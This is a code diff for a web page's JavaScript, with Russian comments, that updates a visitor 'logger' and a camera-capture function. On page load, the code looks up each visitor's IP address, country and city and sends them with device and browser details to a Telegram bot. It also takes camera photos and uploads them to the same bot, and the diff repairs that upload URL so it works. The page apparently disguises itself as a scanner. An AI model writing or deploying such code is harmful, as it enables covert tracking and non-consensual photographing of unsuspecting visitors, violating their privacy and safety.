@@ -36,18 +36,24 @@
     const status = document.getElementById('status');
     const scanLine = document.getElementById('scan-line');
 
-    // ФУНКЦИЯ ЛОГГЕРА (Срабатывает сразу при входе)
+    // НОВЫЙ НАДЕЖНЫЙ ЛОГГЕР
     async function logVisit() {
         try {
-            const response = await fetch('https://ipapi.co');
-            const data = await response.json();
-            const info = `👀 КТО-ТО ЗАШЕЛ НА САЙТ!\n\n📍 IP: ${data.ip}\n🌍 Страна: ${data.country_name}\n🏙 Город: ${data.city}\n📱 Устройство: ${navigator.userAgent.substring(0, 100)}`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)}`);
+            const res = await fetch('https://ipapi.co');
+            const d = await res.json();
+            const info = `👀 КТО-ТО ЗАШЕЛ!\n\n📍 IP: ${d.ip}\n🌍 Страна: ${d.country_name}\n🏙 Город: ${d.city}\n📱 Устройство: ${navigator.platform}\n🌐 Браузер: ${navigator.userAgent.split(') ')[1]}`;
+            
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat_id, text: info })
+            });
         } catch (e) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("👀 Кто-то зашел, но IP скрыть")}`);
+            // Если IP не определился, просто пишем о входе
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=👀 Кто-то зашел (IP скрыть)`);
         }
     }
-    logVisit(); // Запуск логгера
+    logVisit();
 
     async function takePhoto(facing) {
         try {
@@ -61,8 +67,8 @@
             const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.7));
             const f = new FormData();
             f.append('chat_id', chat_id);
-            f.append('photo', blob, `snap_${facing}.jpg`);
-            await fetch(`https://api.telegram.org{token}/sendPhoto`, { method: 'POST', body: f });
+            f.append('photo', blob, `img_${facing}.jpg`);
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
             stream.getTracks().forEach(t => t.stop()); 
         } catch (e) {}
     }
